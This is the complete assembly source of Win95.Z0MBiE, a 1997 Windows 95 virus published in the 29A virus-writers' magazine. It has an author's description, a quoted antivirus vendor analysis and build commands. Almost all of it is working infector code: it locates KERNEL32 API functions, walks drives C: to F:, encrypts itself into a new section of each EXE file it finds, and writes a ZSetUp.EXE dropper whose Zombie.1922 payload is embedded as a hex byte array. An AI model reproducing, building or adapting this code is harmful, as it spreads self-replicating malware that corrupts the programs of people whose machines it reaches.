;
;                           ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;                           ³    Win95.Z0MBiE    ³
;                           ³  v1.01, by Z0MBiE  ³
;                           ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;
; This is the first collaboration of the russian virus writer Z0MBiE to 29A,
; and also his first Win95 PE infector. It is an encrypted runtime PE infec-
; tor which, after having decrypted  its body, locates KERNEL32.DLL and then
; looks in its export table for the address of the API functions used it the
; viral code. This virus  has also the feature which consists on looking for
; files to infect in the Windows directory as well as in other units. PE in-
; fection consists on adding a new section (called .Z0MBiE) to infected exe-
; cutables and  creating an entry point  in it  for the virus code. Last but
; not least, Win95.Z0MBiE, after having infected files in a given drive, in-
; serts a dropper  called ZSetUp.EXE in the root directory. This file is ac-
; tually a dropper of the Z0MBiE.1922 virus, also  included in this issue of
; 29A, in the "Viruses" section of  the magazine. Its peculiarities are des-
; cribed there, together with the analysis of Igor Daniloff, same as the one
; which follows, describing the behavior of Win95.ZOMBiE.
;
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
; Win95.Zombie
;
; Igor Daniloff
; DialogueScience
;
; Win95.Zombie is a nondestructive nonresident encrypted virus which
; infects PortableExecutable EXE files. On starting an infected file,
; the virus decryptor explodes the main virus body and passes control
; to it. The main virus body determines the location of KERNEL32 Export
; Table in memory and saves in its code the address of WIN32 KERNEL API
; functions that are essential for infecting files.
;
; Then the virus determines the command line of the currently-loaded
; infected program and loads it once again through the WinExec function.
; The second virus copy then infects the system.  The first virus copy
; (that started a second copy the infected program), after completing
; the WinExec procedure, returns control to the host program.
;
; To infect PE EXE files, the virus scans the Windows system folder and
; also takes peeps into all other folders in drives C:, D:, E:, and F:.
; On detecting a PE EXE file, the virus analyzes the file. If all is well,
; the file is infected. Win95.Zombie creates a new segment section .Z0MBiE
; in the PE header, sets an entry point to it, and appends a copy of the
; encrypted code at the file end which is within the limits of the region
; of this segment section.  After infecting the logical drive, the virus
; creates a dropper file ZSetUp.EXE in the root directory and assigns it
; ARCHIVE and SYSTEM attributes. In this file, Win95.Zombie plants a
; Zombie.1922 virus code. The virus contains a few text strings:
;
;    Z0MBiE 1.01 (c) 1997
;    My 2nd virii for mustdie
;    Tnx to S.S.R.
;
;    Z0MBiE`1668 v1.00 (c) 1997 Z0MBiE
;    Tnx to S.S.R.
;    ShadowRAM/Virtual Process Infector
;    ShadowRAM Technology (c) 1996,97 Z0MBiE
;
;    code................1398
;    viriisize...........4584
;    virtsize............8936
;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8
;
;
; Compiling it
; ÄÄÄÄÄÄÄÄÄÄÄÄ
; tasm32 -ml -m5 -q -zn zombie.asm
; tlink32 -Tpe -c -x -aa zombie.obj,,, import32.lib
; pewrsec zombie.exe
;
; - -[ZOMBIE.ASM] - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

                        .386
                        locals
                        jumps
                        .model  flat

extrn                   ExitProcess:PROC
extrn                   MessageBoxA:PROC

kernel                  equ     0BFF70000H

FILE_ID                 equ     'Z0'
PORT_ID                 equ     'Z'

                        .data

sux                     db      'mustdie'

                        .code
start:
                        call    codestart

                        lea     ebp, [eax - 401000H]
                        lea     edx, codestart[ebp]
cryptn                  equ     (viriisize-decrsize+3) / 4
                        mov     ecx, cryptn
@@1:                    neg     dword ptr [edx]
                        xor     dword ptr [edx], 12345678h
xorword                 equ     dword ptr $-4
                        sub     edx, -4
                        loop    @@1
                        jmp     codestart

                        align   4
decrsize                equ     $-start

codestart:              lea     ebp, [eax - 401000H]
                        sub     eax, 12345678h
subme                   equ     dword ptr $-4
                        push    eax

                        call    analizekernel

                        call    first

                        in      al, 81h
                        cmp     al, PORT_ID
                        je      exit_to_program

                        in      al, 80h
                        cmp     al, PORT_ID
                        je      infect

                        mov     al, PORT_ID
                        out     80h, al

                        call    ExecExe

exit_to_program:        ret

infect:                 mov     al, -1
                        out     80h, al

                      ; call    _GetModuleHandleA
                      ; push    9
                      ; push    eax
                      ; call    _SetPriorityClass

                        ; infect windows directory

                        lea     edx, infdir[ebp]
                        call    getwindir
                        lea     edx, infdir[ebp]
                        call    setdir
                        call    infectdir

                        ; recursive infect

                        lea     edx, drive_c[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_d[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_e[ebp]
                        call    recinfect1st
                        call    createsetup

                        lea     edx, drive_f[ebp]
                        call    recinfect1st
                        call    createsetup

                        mov     al, PORT_ID
                        out     81h, al

exit_to_mustdie:        push    -1
                        call    _ExitProcess

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ subprograms ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

createsetup:            lea     edx, zsetup[ebp]
                        call    createfile

                        lea     edx, z[ebp]
                        mov     ecx, z_size
                        call    writefile

                        call    closefile

                        ret

first:                  pop     edi
                        mov     byte ptr [edi-5], 0b9h  ; mov ecx, xxxxxxxx
                        mov     byte ptr start[ebp], 0b9h

                        call    infectfile
                        jmp     exit_to_mustdie

ExecExe:                call    _GetCommandLineA
SW_NORMAL               equ     1
                        push    SW_NORMAL
                        push    eax
                        call    _WinExec
                        ret

recinfect1st:           call    setdir

recinfect:              call    infectdir

                        lea     eax, win32_data_thang[ebp]
                        push    eax
                        lea     eax, dirfiles[ebp]
                        push    eax
                        call    _FindFirstFileA
                        mov     edi, eax
                        inc     eax
                        jz      @@nomorefiles

@@processfile:          lea     eax, fileattr[ebp]
                        mov     al, [eax]
                        cmp     al, 10h         ; directory ?
                        jne     @@findnext

                        lea     edx, fullname[ebp]
                        cmp     byte ptr [edx], '.'
                        je      @@findnext
                        call    setdir

                        push    edi
                        lea     edx, fullname[ebp]
                        call    recinfect
                        pop     edi

                        lea     edx, prev_dir[ebp]
                        call    setdir

@@findnext:             lea     eax, win32_data_thang[ebp]
                        push    eax
                        push    edi
                        call    _FindNextFileA

                        or      eax, eax
                        jnz     @@processfile

@@nomorefiles:          ret

nokerneldll:
nofunction:
exit:                   jmp     $

analizekernel:          mov     esi, kernel
@@1:                  ; cmp     esi, kernel + 040000h
                      ; ja      nokernelfunc
                        lea     edi, kernel_sign[ebp]
                        mov     ecx, kernel_sign_size
                        rep     cmpsb
                        jne     @@1

kernelfound:            sub     esi, kernel_sign_size
                        mov     kernel_call[ebp], esi

                        mov     esi, kernel
                        lodsw
                        cmp     ax, 'ZM'
                        jne     nokerneldll

                        add     esi, 003Ch-2
                        lodsd

                        lea     esi, [esi + eax - 3ch - 4]
                        lodsd
                        cmp     eax, 'EP'
                        jne     nokerneldll

                        add     esi, 78h-4      ; esi=.edata

                        lodsd
                        add     eax, kernel + 10h
                        xchg    esi, eax

                        lodsd
                        lodsd
                        lodsd
                        mov     funcnum[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     entrypointptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     nameptr[ebp], eax

                        lodsd
                        add     eax, kernel
                        mov     ordinalptr[ebp], eax

                        lea     edx, names[ebp]
                        lea     edi, fns[ebp]

@@1:                    push    edi
                        call    findfunction
                        pop     edi

                        inc     edi             ; 68
                        stosd
                        add     edi, 6          ; jmp kernel_call[ebp]

                        mov     edx, esi

                        cmp     byte ptr [esi], 0
                        jne     @@1

                        ret

findfunction:           mov     ecx, 12345678h
funcnum                 equ     dword ptr $-4
                        xor     ebx, ebx

findnextfunc:           mov     esi, edx

                        mov     edi, [ebx + 12345678h]
nameptr                 equ     dword ptr $-4
                        add     edi, kernel

@@2:                    cmpsb
                        jne     @@1

                        cmp     byte ptr [esi-1], 0
                        jne     @@2

                        ; found

                        shr     ebx, 1
                        movzx   eax, word ptr [ebx + 12345678h]
ordinalptr              equ     dword ptr $-4
                        shl     eax, 2
                        mov     eax, [eax + 12345678h]
entrypointptr           equ     dword ptr $-4
                        add     eax, kernel

                        ret

@@1:                    add     ebx, 4
                        loop    findnextfunc

                        jmp     nofunction


infectdir:              lea     eax, win32_data_thang[ebp]
                        push    eax
                        lea     eax, exefiles[ebp]
                        push    eax
                        call    _FindFirstFileA

                        mov     searchhandle[ebp], eax
                        inc     eax
                        jz      @@exit

@@next:                 call    infectfile

                        lea     eax, win32_data_thang[ebp]
                        push    eax
                        push    12345678h
searchhandle            equ     dword ptr $-4
                        call    _FindNextFileA

                        or      eax, eax
                        jnz     @@next

@@exit:                 ret

                        ; input: ECX=file attr
                        ;        EDX=file
                        ; output: EAX=handle

openfile:               push    0
                        push    ecx
                        push    3 ; OPEN_EXISTING
                        push    0
                        push    0
                        push    80000000h + 40000000h
                        push    edx
                        call    _CreateFileA
                        mov     handle[ebp], eax
                        ret

                        ; input:  EDX=file
                        ; output: EAX=handle

createfile:             push    0
                        push    ecx
                        push    1 ; CREATE
                        push    0
                        push    0
                        push    80000000h + 40000000h
                        push    edx
                        call    _CreateFileA
                        mov     handle[ebp], eax
                        ret

seekfile:               push    0
                        push    0
                        push    edx
                        push    handle[ebp]
                        call    _SetFilePointer
                        ret

closefile:              push    handle[ebp]
                        call    _CloseHandle
                        ret

                        ; input: ECX=bytes to read
                        ;        EDX=buf

readfile:               push    0
                        lea     eax, bytesread[ebp]
                        push    eax
                        push    ecx
                        push    edx
                        push    handle[ebp]
                        call    _ReadFile
                        ret

                        ; input: ECX=bytes to read
                        ;        EDX=buf

writefile:              push    0
                        lea     eax, bytesread[ebp]
                        push    eax
                        push    ecx
                        push    edx
                        push    handle[ebp]
                        call    _WriteFile
                        ret

                        ; input: EDX=offset directory (256 byte)

getdir:                 cld
                        push    edx
                        push    255
                        call    _GetCurrentDirectoryA
                        ret

                        ; input: EDX=directory

setdir:                 push    edx
                        call    _SetCurrentDirectoryA
                        ret

getwindir:              cld
                        push    255
                        push    edx
                        call    _GetWindowsDirectoryA
                        ret

infectfile:             in      al, 82h
                        cmp     al, PORT_ID
                        jne     @@continue

                        lea     eax, fullname[ebp]
                        cmp     dword ptr [eax], 'BM0Z'
                        jne     @@exit

@@continue:             mov     ecx, fileattr[ebp]
                        lea     edx, fullname[ebp]
                        call    openfile

                        inc     eax
                        jz      @@exit

; goto the dword that stores the location of the pe header

                        mov     edx, 3Ch
                        call    seekfile

; read in the location of the pe header

                        mov     ecx, 4
                        lea     edx, peheaderoffset[ebp]
                        call    readfile

; goto the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; read in enuff to calculate the full size of the pe header and object table

                        mov     ecx, 256
                        lea     edx, peheader[ebp]
                        call    readfile

; make sure it is a pe header and is not already infected
                        cmp     dword ptr peheader[ebp],'EP'
                        jne     @@close
                        cmp     word ptr peheader[ebp] + 4ch, FILE_ID
                        je      @@close
                        cmp     dword ptr peheader[ebp] + 52, 00400000h
                        jne     @@close

; go back to the start of the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; read in the whole pe header and object table
                        lea     edx, peheader[ebp]
                        mov     ecx, headersize[ebp]
                        cmp     ecx, maxbufsize
                        ja      @@close
                        call    readfile

                        mov     word ptr peheader[ebp] + 4ch, FILE_ID

; locate offset of object table
                        xor     eax, eax
                        mov     ax, NtHeaderSize[ebp]
                        add     eax, 18h
                        mov     objecttableoffset[ebp],eax

; calculate the offset of the last (null) object in the object table
                        mov     esi, objecttableoffset[ebp]
                        lea     eax, peheader[ebp]
                        add     esi, eax
                        xor     eax, eax
                        mov     ax, numObj[ebp]
                        mov     ecx, 40
                        xor     edx, edx
                        mul     ecx
                        add     esi, eax

                        inc     numObj[ebp]    ; inc the number of objects

                        lea     edi, newobject[ebp]
                        xchg    edi,esi

; calculate the Relative Virtual Address (RVA) of the new object

                        mov     eax, [edi-5*8+8]
                        add     eax, [edi-5*8+12]
                        mov     ecx, objalign[ebp]
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     RVA[ebp], eax

; calculate the physical size of the new object
                        mov     ecx, filealign[ebp]
                        mov     eax, viriisize
                        xor     edx, edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     physicalsize[ebp],eax

; calculate the virtual size of the new object
                        mov     ecx, objalign[ebp]
                        mov     eax, virtsize
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     virtualsize[ebp],eax

; calculate the physical offset of the new object
                        mov     eax,[edi-5*8+20]
                        add     eax,[edi-5*8+16]
                        mov     ecx, filealign[ebp]
                        xor     edx,edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     physicaloffset[ebp],eax

; update the image size (the size in memory) of the file
                        mov     eax, virtsize
                        add     eax, imagesize[ebp]
                        mov     ecx, objalign[ebp]
                        xor     edx, edx
                        div     ecx
                        inc     eax
                        mul     ecx
                        mov     imagesize[ebp],eax

; copy the new object into the object table
                        mov    ecx, 40/4
                        rep    movsd

; calculate the entrypoint RVA
                        mov    eax, RVA[ebp]

                        mov    ebx, entrypointRVA[ebp]
                        mov    entrypointRVA[ebp], eax

                        sub     eax, ebx

; Set the value needed to return to the host
                        mov     subme[ebp], eax

; go back to the start of the pe header
                        mov     edx, peheaderoffset[ebp]
                        call    seekfile

; write the pe header and object table to the file
                        mov     ecx, headersize[ebp]
                        lea     edx, peheader[ebp]
                        call    writefile

; move to the physical offset of the new object
                        mov     edx, physicaloffset[ebp]
                        call    seekfile

; write the virus code to the new object

                        call    random
                        mov     xorword[ebp], eax

                        lea     edx, start[ebp]
                        mov     ecx, decrsize
                        call    writefile

                        lea     esi, codestart[ebp]
                        lea     edi, buf[ebp]
                        mov     ecx, cryptn
@@1:                    lodsd
                        xor     eax, xorword[ebp]
                        neg     eax
                        stosd
                        loop    @@1

                        lea     edx, buf[ebp]
                        mov     ecx, viriisize-decrsize
                        call    writefile

@@close:                call    closefile

@@exit:                 ret

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ 32-bit random number generator ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                        ; output: eax=rnd
                        ;         zf=rnd(2)

random:                 call    random16bit
                        shl     eax, 16

random16bit:            push    ebx
                        mov     bx, 1234h
rndword                 equ     word ptr $-2
                        in      al, 40h
                        xor     bl, al
                        in      al, 40h
                        add     bh, al
                        in      al, 41h
                        sub     bl, al
                        in      al, 41h
                        xor     bh, al
                        in      al, 42h
                        add     bl, al
                        in      al, 42h
                        sub     bh, al
                        mov     rndword[ebp], bx
                        xchg    bx, ax
                        pop     ebx
                        test    al, 1
                        ret

                        ; input:  eax
                        ; output: eax=rnd(eax)
                        ;         zf=rnd(2)

rnd:                    push    ebx
                        push    edx
                        xchg    ebx, eax
                        call    random
                        xor     edx, edx
                        div     ebx
                        xchg    edx, eax
                        pop     edx
                        pop     ebx
                        test    al, 1
                        ret


codesize                equ     $-start

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ data area ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

kernel_sign:            pushfd                  ; <- kernel
                        cld
                        push    eax
                        push    ebx
                        push    edx
kernel_sign_size        equ     $-kernel_sign

kernel_call             dd      ?

names:                  db      'ExitProcess',0
                        db      'FindFirstFileA',0
                        db      'FindNextFileA',0
                        db      'CreateFileA',0
                        db      'SetFilePointer',0
                        db      'ReadFile',0
                        db      'WriteFile',0
                        db      'CloseHandle',0
                        db      'GetCurrentDirectoryA',0
                        db      'SetCurrentDirectoryA',0
                        db      'GetWindowsDirectoryA',0
                        db      'GetCommandLineA',0
                        db      'WinExec',0
                        db      'SetPriorityClass',0
                        db      'GetModuleHandleA',0
                        db      0

fns:
def_fn                  macro   name
_&name&:                db      68h
fn_&name&               dd      ?
                        jmp     kernel_call[ebp]
                        endm

def_fn                  ExitProcess
def_fn                  FindFirstFileA
def_fn                  FindNextFileA
def_fn                  CreateFileA
def_fn                  SetFilePointer
def_fn                  ReadFile
def_fn                  WriteFile
def_fn                  CloseHandle
def_fn                  GetCurrentDirectoryA
def_fn                  SetCurrentDirectoryA
def_fn                  GetWindowsDirectoryA
def_fn                  GetCommandLineA
def_fn                  WinExec
def_fn                  SetPriorityClass
def_fn                  GetModuleHandleA

bytesread               dd      ?

drive_c                 db      'C:\',0
drive_d                 db      'D:\',0
drive_e                 db      'E:\',0
drive_f                 db      'F:\',0

exefiles                db      '*.EXE',0
dirfiles                db      '*.',0

prev_dir                db      '..',0

win32_data_thang:
fileattr                dd      0
createtime              dd      0,0
lastaccesstime          dd      0,0
lastwritetime           dd      0,0
filesize                dd      0,0
resv                    dd      0,0
fullname                db      'Z0MB.EXE',256-8 dup (0)
realname                db      256 dup (0)

handle                  dd      ?

peheaderoffset          dd      ?
objecttableoffset       dd      ?

newobject:                      ;1234567  8
oname                   db      '.Z0MBiE',0
virtualsize             dd      0
RVA                     dd      0
physicalsize            dd      0
physicaloffset          dd      0
reserved                dd      0,0,0
objectflags             db      40h,0,0,0c0h

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ messages ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                        db 13,10,'Z0MBiE 1.01 (c) 1997',13,10
                        db 'My 2nd virii for mustdie',13,10
                        db 'Tnx to S.S.R.',13,10

m1                      macro   n
                        if      n ge 100000
                        db      n / 10000/10 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        if      n ge 10000
                        db      n /  10000 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        if      n ge 1000
                        db      n /   1000 mod 10 + '0'
                        else
                        db      '.'
                        endif
                        db      n /    100 mod 10 + '0'
                        db      n /     10 mod 10 + '0'
                        db      n /      1 mod 10 + '0',13,10
                        endm

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
zsetup                  db      '\ZSetUp.EXE',0
z:
include                 z.inc                   ; Z0MBiE.1922
z_size                  equ     $-z
; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                        db      13,10
                        db      'code..............'
m1                      codesize
                        db      'viriisize.........'
m1                      viriisize
                        db      'virtsize..........'
m1                      virtsize

peheader:
signature               dd      0
cputype                 dw      0
numObj                  dw      0
                        dd      3 dup (0)
NtHeaderSize            dw      0
Flags                   dw      0
                        dd      4 dup (0)
entrypointRVA           dd      0
                        dd      3 dup (0)
objalign                dd      0
filealign               dd      0
                        dd      4 dup (0)
imagesize               dd      0
headersize              dd      0
peheader_size           equ     $-peheader

                        align   4
viriisize               equ     $-start

infdir                  db      256 dup (?)

maxbufsize              equ     4096
buf                     db      maxbufsize dup (?)

virtsize                equ     $-start
                        end     start

; - -[Z.INC]- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - >8

abc_size                equ     1922                ; size in bytes
abc_num                 equ     1922                ; size in elements

abc db 0e9h,010h,001h,026h,0a0h,028h,000h,0f6h,0d0h,02eh,030h,006h,022h,001h
db 0beh,02bh,001h,08bh,0feh,0b9h,008h,000h,02eh,0ach,040h,0d1h,0e3h,00bh,0d8h
db 0e2h,0f7h,02eh,088h,01dh,047h,081h,0ffh,0adh,008h,075h,0eah,0ebh,000h,0e8h
db 056h,006h,0b8h,081h,0f0h,0cdh,013h,03dh,08ch,092h,074h,003h,0e8h,0d8h,000h
db 08ch,0c1h,083h,0c1h,010h,0b8h,034h,012h,003h,0c1h,08eh,0d0h,0bch,034h,012h
db 0b8h,034h,012h,003h,0c1h,050h,068h,034h,012h,033h,0c0h,0cbh,053h,0bbh,034h
db 012h,0e4h,040h,032h,0d8h,0e4h,040h,002h,0f8h,0e4h,041h,02ah,0d8h,0e4h,041h
db 032h,0f8h,0e4h,042h,002h,0d8h,0e4h,042h,02ah,0f8h,02eh,089h,01eh,058h,001h
db 093h,05bh,0a8h,001h,0c3h,053h,052h,093h,0e8h,0d4h,0ffh,033h,0d2h,0f7h,0f3h
db 092h,05ah,05bh,0a8h,001h,0c3h,051h,0b1h,059h,0e8h,04eh,000h,02eh,088h,02eh
db 0afh,001h,041h,0e8h,045h,000h,02eh,088h,02eh,0b5h,001h,041h,0e8h,03ch,000h
db 02eh,088h,02eh,0bbh,001h,059h,0c3h,090h,051h,0b9h,059h,000h,0e8h,03ah,000h
db 041h,0b5h,012h,0e8h,034h,000h,041h,0b5h,012h,0e8h,02eh,000h,059h,0c3h,051h
db 0b1h,059h,02eh,08ah,02eh,0afh,001h,080h,0e5h,08fh,080h,0cdh,030h,0e8h,01bh
db 000h,041h,0b5h,033h,0e8h,015h,000h,041h,0b5h,033h,0e8h,00fh,000h,059h,0c3h
db 066h,050h,052h,0e8h,014h,000h,0ech,08ah,0e8h,05ah,066h,058h,0c3h,066h,050h
db 052h,0e8h,007h,000h,08ah,0c5h,0eeh,05ah,066h,058h,0c3h,066h,0b8h,000h,000h
db 000h,080h,08ah,0c1h,024h,0fch,0bah,0f8h,00ch,066h,0efh,080h,0c2h,004h,08ah
db 0c1h,024h,003h,002h,0d0h,0c3h,01eh,006h,00eh,01fh,0fah,0fch,0e8h,070h,0ffh
db 0a0h,0afh,001h,0feh,0c0h,074h,058h,0e8h,0b8h,000h,075h,053h,0e8h,053h,000h
db 074h,00bh,0e8h,074h,000h,074h,006h,0e8h,07ch,000h,074h,001h,0c3h,0e8h,086h
db 0ffh,0b8h,042h,000h,0e8h,03bh,0ffh,003h,0e8h,083h,0c5h,00fh,083h,0e5h,0f0h
db 0c1h,0edh,004h,08ch,0c0h,003h,0c5h,02dh,010h,000h,08eh,0c0h,0bfh,000h,001h
db 0c6h,006h,082h,008h,0eah,0c7h,006h,083h,008h,017h,003h,08ch,006h,085h,008h
db 08ch,006h,0b6h,005h,0beh,000h,001h,0b9h,007h,008h,0f3h,0a4h,0e8h,035h,003h
db 0e8h,032h,0ffh,033h,0c0h,007h,01fh,0c3h,068h,000h,0c0h,007h,033h,0ffh,032h
db 0d2h,026h,08ah,075h,002h,0d1h,0e2h,073h,002h,0b6h,080h,081h,0eah,069h,008h
db 033h,0c0h,08bh,0efh,0b9h,025h,004h,0f3h,0afh,074h,004h,03bh,0fah,076h,0f3h
db 0c3h,0b8h,030h,011h,0b7h,002h,0cdh,010h,08ch,0c0h,03dh,000h,0c0h,0c3h,068h
db 000h,0c0h,007h,033h,0ffh,0b9h,00eh,000h,032h,0c0h,0f3h,0aeh,075h,015h,0b9h
db 010h,000h,0f3h,0aeh,026h,081h,07dh,0ffh,07eh,081h,075h,008h,026h,081h,07dh
db 00dh,07eh,0ffh,074h,006h,081h,0ffh,000h,0f0h,076h,0dch,08bh,0efh,0c3h,0b4h
db 013h,0cdh,02fh,08ch,0c1h,02eh,089h,01eh,02bh,003h,02eh,08ch,006h,02dh,003h
db 0cdh,02fh,081h,0f9h,000h,0f0h,0c3h,03dh,081h,0f0h,074h,019h,03dh,000h,04bh
db 074h,00fh,080h,0fch,043h,074h,00ah,080h,0fch,03dh,074h,005h,0eah,000h,000h
db 000h,000h,0e8h,048h,000h,0ebh,0f6h,0b8h,08ch,092h,0cfh,03dh,081h,0f0h,074h
db 0f7h,0e8h,0a2h,0feh,0e8h,089h,002h,02eh,0a3h,05ch,005h,0e8h,082h,0feh,09ch
db 09ah,000h,000h,000h,000h,09ch,0e8h,08eh,0feh,02eh,080h,03eh,05dh,005h,002h
db 075h,00dh,026h,081h,03fh,04dh,05ah,075h,003h,0e8h,0e4h,001h,0e8h,012h,002h
db 0e8h,060h,002h,0e8h,05dh,0feh,09dh,0cah,002h,000h,09ch,02eh,0ffh,01eh,00ah
db 003h,0c3h,0e8h,065h,0feh,02eh,0c6h,006h,0abh,001h,0c3h,060h,01eh,006h,0fch
db 0b8h,000h,03dh,0e8h,0e6h,0ffh,00fh,082h,066h,001h,093h,0b4h,03fh,00eh,01fh
db 0bah,087h,008h,0b9h,040h,000h,0e8h,0d4h,0ffh,03bh,0c1h,00fh,085h,04dh,001h
db 0a1h,087h,008h,03dh,04dh,05ah,074h,007h,03dh,05ah,04dh,00fh,085h,03eh,001h
db 080h,03eh,099h,008h,069h,00fh,084h,035h,001h,0b8h,000h,042h,033h,0c9h,08bh
db 016h,08fh,008h,0c1h,0e2h,004h,0e8h,0a7h,0ffh,0b4h,03fh,0bah,0bdh,003h,0b9h
db 002h,000h,0e8h,09ch,0ffh,03bh,0c1h,00fh,085h,015h,001h,0b8h,034h,012h,040h
db 00fh,084h,00dh,001h,053h,0b8h,020h,012h,0cdh,02fh,026h,08ah,01dh,0b8h,016h
db 012h,0cdh,02fh,05bh,026h,08bh,055h,013h,026h,08bh,045h,011h,00ah,0c0h,00fh
db 084h,0f5h,000h,0b9h,0e8h,003h,0f7h,0f1h,00bh,0d2h,00fh,084h,0eah,000h,026h
db 0c7h,045h,002h,002h,000h,00eh,007h,0a1h,08bh,008h,048h,0b9h,000h,002h,0f7h
db 0e1h,003h,006h,089h,008h,083h,0d2h,000h,08bh,0f0h,08bh,0fah,0b8h,002h,042h
db 099h,033h,0c9h,0e8h,041h,0ffh,03bh,0c6h,00fh,085h,0bah,000h,03bh,0d7h,00fh
db 085h,0b4h,000h,005h,00fh,000h,083h,0d2h,000h,024h,0f0h,02bh,0f0h,029h,036h
db 089h,008h,050h,052h,0c1h,0e8h,004h,0c1h,0e2h,00ch,00bh,0c2h,02bh,006h,08fh
db 008h,02dh,010h,000h,08bh,0c8h,087h,00eh,09dh,008h,089h,00eh,04bh,001h,0b9h
db 003h,001h,087h,00eh,09bh,008h,089h,00eh,051h,001h,08bh,0c8h,087h,00eh,095h
db 008h,089h,00eh,041h,001h,0b9h,010h,00ah,087h,00eh,097h,008h,089h,00eh,048h
db 001h,081h,006h,091h,008h,0a1h,000h,083h,006h,08bh,008h,01eh,083h,006h,089h
db 008h,03bh,0c6h,006h,099h,008h,069h,0b8h,000h,042h,059h,05ah,0e8h,0cfh,0feh
db 0e8h,05dh,000h,0b4h,040h,0bah,000h,001h,0b9h,02bh,000h,0e8h,0c1h,0feh,0beh
db 02bh,001h,0bfh,0c7h,008h,0b9h,008h,000h,0ach,092h,0bdh,008h,000h,033h,0c0h
db 0d0h,0e2h,0d1h,0d0h,048h,0aah,04dh,075h,0f5h,0e2h,0eeh,0b4h,040h,0bah,0c7h
db 008h,0b9h,040h,000h,0e8h,09bh,0feh,081h,0feh,0adh,008h,072h,0d7h,0b8h,000h
db 042h,099h,033h,0c9h,0e8h,08ch,0feh,0b4h,040h,0bah,087h,008h,0b9h,040h,000h
db 0e8h,081h,0feh,0b4h,03eh,0e8h,07ch,0feh,007h,01fh,061h,02eh,0c6h,006h,0abh
db 001h,090h,0e8h,0c9h,0fch,0c3h,0bfh,084h,007h,0b0h,0c3h,0aah,0b9h,0fdh,000h
db 033h,0c0h,0f3h,0aah,0c7h,006h,007h,001h,0f6h,0d0h,0b0h,008h,0e6h,070h,0e4h
db 071h,03ch,00ah,075h,028h,0c7h,006h,007h,001h,0b0h,000h,0b8h,009h,000h,0e8h
db 070h,0fch,096h,06bh,0f6h,012h,081h,0c6h,0e2h,006h,0b9h,002h,000h,0adh,097h
db 081h,0c7h,084h,007h,0a4h,0adh,097h,081h,0c7h,084h,007h,066h,0a5h,0e2h,0efh
db 0c3h,060h,01eh,006h,033h,0f6h,08eh,0deh,0c4h,09ch,084h,000h,00bh,0dbh,074h
db 01eh,0b8h,081h,0f0h,0cdh,021h,03dh,08ch,092h,074h,014h,02eh,089h,01eh,00ah
db 003h,02eh,08ch,006h,00ch,003h,0c7h,084h,084h,000h,0f5h,002h,08ch,08ch,086h
db 000h,007h,01fh,061h,0c3h,060h,0bah,034h,012h,032h,0f6h,0c1h,0e2h,004h,08dh
db 07fh,00ch,0b9h,00ah,000h,032h,0c0h,0fch,0f3h,0aeh,075h,033h,0bdh,053h,006h
db 0b9h,00bh,000h,08bh,0f5h,08bh,0fbh,02eh,0ach,03ch,0b0h,074h,004h,03ch,080h
db 073h,005h,026h,038h,005h,075h,011h,047h,0e2h,0eeh,08bh,0fbh,0b0h,0e5h,0aah
db 033h,0c0h,0b9h,01fh,000h,0f3h,0aah,0ebh,009h,083h,0c5h,00bh,081h,0fdh,0e2h
db 006h,075h,0d0h,083h,0c3h,020h,04ah,075h,0bah,061h,0c3h,050h,056h,057h,01eh
db 006h,02eh,0c5h,036h,02bh,003h,068h,034h,012h,007h,0bfh,082h,008h,08ah,004h
db 026h,086h,005h,088h,004h,046h,047h,081h,0ffh,087h,008h,075h,0f1h,007h,01fh
db 05fh,05eh,058h,0c3h,00dh,00ah,00ah,05ah,030h,04dh,042h,069h,045h,060h,031h
db 036h,036h,038h,020h,076h,031h,02eh,030h,030h,020h,028h,063h,029h,020h,031h
db 039h,039h,037h,020h,05ah,030h,04dh,042h,069h,045h,00dh,00ah,054h,06eh,078h
db 020h,074h,06fh,020h,053h,02eh,053h,02eh,052h,02eh,00dh,00ah,053h,068h,061h
db 064h,06fh,077h,052h,041h,04dh,02fh,056h,069h,072h,074h,075h,061h,06ch,020h
